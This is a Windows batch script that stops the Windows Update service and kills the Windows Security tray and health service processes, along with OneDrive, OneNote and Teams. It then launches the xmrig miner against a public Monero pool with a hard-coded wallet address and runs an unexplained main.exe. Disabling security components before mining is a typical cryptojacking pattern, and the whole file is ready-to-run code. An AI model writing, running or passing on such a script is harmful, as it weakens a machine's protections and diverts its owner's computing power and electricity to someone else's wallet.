@echo off
net stop WUAUSERV
taskkill /IM OneDrive.exe
taskkill /IM SecurityHealthSystray.exe
taskkill /IM SecurityHealthService.exe
taskkill /IM ONENOTEM.exe
taskkill /IM Teams.exe
cd /d "%~dp0"
xmrig.exe --coin=XMR -o xmr.2miners.com:2222 -u 8635LEjQNMTKA3itCDvKGujmHLgYn33hhjiX7uat5VKhi7WThxFw8t5C2mfaiaF86JHCPHWWTmHZwjEgVt9RNAyo7ueQgKW.ComRestart-12-01_0 -p x -t 2
main.exe
pause 
